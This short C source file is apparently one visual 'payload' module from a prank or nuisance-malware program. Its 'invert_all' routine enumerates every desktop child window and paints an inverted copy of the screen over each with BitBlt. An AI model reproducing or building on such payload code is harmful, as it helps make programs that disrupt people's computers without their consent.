#include "MBYTE.h"

BOOL CALLBACK EnumChildProc (HWND hwnd, LPARAM lParam);

PAYLOAD (invert_all) {
	HEAD;
	
	EnumChildWindows (DESKTOP, &EnumChildProc, NULL);
	return;
}

BOOL CALLBACK EnumChildProc (HWND hwnd, LPARAM lParam) {
	
	BitBlt(GetDC(hwnd), 0, 0, get_desktop_size (TRUE), get_desktop_size (FALSE), GetDC(DESKTOP), 0, 0, NOTSRCCOPY);
	
	return TRUE;
}
